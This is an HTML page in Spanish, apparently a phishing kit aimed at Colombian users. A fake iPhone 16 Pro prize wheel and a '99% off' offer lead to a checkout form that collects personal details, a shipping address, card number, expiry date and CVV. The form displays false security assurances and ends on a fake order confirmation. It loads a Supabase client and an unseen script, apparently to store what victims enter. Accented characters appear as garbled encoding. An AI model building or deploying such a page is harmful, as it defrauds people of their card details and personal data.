<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>¬°Gira y Gana un iPhone 16 Pro!</title>
    <link rel="icon" type="image/png" href="logo.png">
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <!-- Part√≠culas de confetti -->
    <canvas id="confetti"></canvas>

    <div class="container">
        <!-- Encabezado -->
        <header class="header">
            <h1 class="title">Gira y Gana</h1>
            <p class="subtitle">iPhone 16 Pro</p>
        </header>

        <!-- Contenedor de la ruleta -->
        <div class="wheel-container">
            <div class="wheel-pointer"></div>
            <canvas id="wheel" width="350" height="350"></canvas>
            <button id="spinButton" class="spin-button">SPIN</button>
        </div>

        <!-- Informaci√≥n adicional -->
        <div class="info-box">
            <p> üéÅ Gira la ruleta y descubre tu premio</p>
        </div>
    </div>

    <!-- Modal de Premio -->
    <div id="prizeModal" class="modal">
        <div class="modal-overlay"></div>
        <div class="modal-content">
            <div class="modal-header">
                <h2>¬°Te uniste con √©xito!</h2>
                <p class="modal-subtitle">Obtener el 1 oct 9:30 pm</p>
            </div>

            <div class="prize-card">
                <div class="discount-badge">
                    <span class="discount-text">99%</span>
                    <span class="off-text">OFF</span>
                </div>
                <img src="iphone.png" alt="iPhone 16 Pro" class="prize-image" id="prizeImage">
                <div class="prize-details">
                    <p class="prize-name">Oferta subvencionada iPhone 16 Pro</p>
                    <div class="price-container">
                        <span class="current-price">$1,000</span>
                        <span class="original-price">$2,000.00</span>
                    </div>
                </div>
            </div>

            <div class="instructions">
                <p>Completa tus datos personales y de env√≠o para recibir el premio y confirmar la entrega correctamente
                    dentro del proceso indicado. Contin√∫a y valida la informaci√≥n solicitada ahora!!!
                </p>
            </div>

            <button class="claim-button" id="claimButton">RECLAMAR AHORA</button>
        </div>
    </div>

    <!-- Checkout Process -->
    <div id="checkoutContainer" class="checkout-container" style="display: none;">
        <div class="checkout-modal">
            <header class="checkout-header">
                <button id="closeCheckout" class="close-btn">&times;</button>
                <div class="checkout-steps">
                    <div class="step active" id="step1-indicator">1</div>
                    <div class="step-divider"></div>
                    <div class="step" id="step2-indicator">2</div>
                    <div class="step-divider"></div>
                    <div class="step" id="step3-indicator">3</div>
                </div>
            </header>

            <!-- Step 1: User Info -->
            <div id="step1" class="checkout-step active">
                <h3>Agregar una nueva direcci√≥n</h3>
                <p class="security-note"><span class="lock-icon">üîí</span> Todos los datos est√°n protegidos</p>

                <form id="addressForm">
                    <div class="form-row">
                        <div class="form-group">
                            <label>Nombre *</label>
                            <input type="text" id="firstName" placeholder="Ej. Juan" required>
                        </div>
                        <div class="form-group">
                            <label>Apellido *</label>
                            <input type="text" id="lastName" placeholder="Ej. P√©rez" required>
                        </div>
                    </div>
                    <div class="form-row">
                        <div class="form-group">
                            <label>Numero de telefono *</label>
                            <input type="number" id="documentId" placeholder="123456789" required>
                        </div>
                        <div class="form-group">
                            <label>Correo electr√≥nico *</label>
                            <input type="email" id="email" placeholder="ejemplo@correo.com" required>
                        </div>
                    </div>
                    <div class="form-group">
                        <label>Departamento *</label>
                        <select id="departmentSelect" required>
                            <option value="">Seleccionar</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Municipio *</label>
                        <select id="municipalitySelect" required disabled>
                            <option value="">Seleccionar</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Direcci√≥n *</label>
                        <input type="text" id="address"
                            placeholder="Calle/Torre/Casa o n√∫mero de apartamento/Oficina, etc." required>
                        <p class="input-hint">P.ej. Calle 56 #28-04</p>
                    </div>
                    <div class="form-group">
                        <label>Informaci√≥n adicional (opcional)</label>
                        <input type="text" id="additionalInfo" placeholder="Piso/Edificio/Fachada/Otro">
                    </div>
                    <button type="submit" class="checkout-btn">Guardar</button>
                </form>
            </div>

            <!-- Step 2: Payment -->
            <div id="step2" class="checkout-step">
                <h3>M√©todos de pago</h3>
                <div class="payment-method-header">
                    <span class="radio-icon filled"></span>
                    <span class="card-icon">üí≥</span>
                    <div class="payment-text">
                        <p>Tarjeta</p>
                        <p class="subtitle">Paga ahora o paga mensualmente</p>
                    </div>
                    <div class="card-brands">
                        <img src="https://img.icons8.com/color/48/000000/visa.png" width="30">
                        <img src="https://img.icons8.com/color/48/000000/mastercard.png" width="30">
                    </div>
                </div>

                <div class="payment-card-form">
                    <p class="security-note"><span class="lock-icon">üîí</span> Todas las transacciones son seguras y
                        cifradas</p>

                    <form id="paymentForm">
                        <div class="form-group">
                            <label>N√∫mero de tarjeta *</label>
                            <div class="input-with-icon">
                                <input type="text" placeholder="N√∫mero de tarjeta" required maxlength="19">
                                <span class="shield-icon">üõ°Ô∏è</span>
                            </div>
                        </div>
                        <div class="form-row">
                            <div class="form-group">
                                <label>Fecha de vencimiento *</label>
                                <div class="date-inputs">
                                    <select required>
                                        <option value="">Mes</option>
                                        <option value="01">01</option>
                                        <option value="02">02</option>
                                        <option value="03">03</option>
                                        <option value="04">04</option>
                                        <option value="05">05</option>
                                        <option value="06">06</option>
                                        <option value="07">07</option>
                                        <option value="08">08</option>
                                        <option value="09">09</option>
                                        <option value="10">10</option>
                                        <option value="11">11</option>
                                        <option value="12">12</option>
                                    </select>
                                    <select required>
                                        <option value="">A√±o</option>
                                        <option value="2024">2024</option>
                                        <option value="2025">2025</option>
                                        <option value="2026">2026</option>
                                        <option value="2027">2027</option>
                                        <option value="2028">2028</option>
                                        <option value="2029">2029</option>
                                        <option value="2030">2030</option>
                                        <option value="2031">2031</option>
                                        <option value="2032">2032</option>
                                        <option value="2033">2033</option>
                                        <option value="2034">2034</option>
                                        <option value="2035">2035</option>
                                    </select>
                                </div>
                            </div>
                            <div class="form-group">
                                <label>CVV * ?</label>
                                <div class="input-with-icon">
                                    <input type="text" placeholder="C√≥digo de 3 a 4 d√≠gitos" required maxlength="4">
                                    <span class="lock-small">üîí</span>
                                </div>
                            </div>
                        </div>
                        <div class="form-checkbox">
                            <input type="checkbox" id="saveCard" checked>
                            <label for="saveCard">Recuerde esta tarjeta para uso futuro.</label>
                        </div>
                        <button type="submit" class="checkout-btn">Pagar ahora</button>
                    </form>
                </div>
            </div>

            <!-- Step 3: Success -->
            <div id="step3" class="checkout-step success-step">
                <div class="success-header">
                    <div class="big-success-icon">‚úÖ</div>
                    <h2>¬°Pedido Confirmado!</h2>
                    <p>Felicidades, tu iPhone 16 Pro est√° en camino.</p>
                </div>
                <div class="shipping-status">
                    <div class="status-box">
                        <p class="status-title">Estado del pedido</p>
                        <p class="status-desc">El producto se encuentra en proceso para ser empacado y enviado
                            correctamente.</p>
                    </div>
                    <div class="tracking-visual">
                        <div class="track-step active">üì¶<br>Procesando</div>
                        <div class="track-line"></div>
                        <div class="track-step">üöö<br>Enviado</div>
                        <div class="track-line"></div>
                        <div class="track-step">üè†<br>Entregado</div>
                    </div>
                </div>
                <button id="finishCheckout" class="checkout-btn">Volver a la tienda</button>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="colombia_data.js"></script>
    <script src="script.js"></script>
</body>

</html>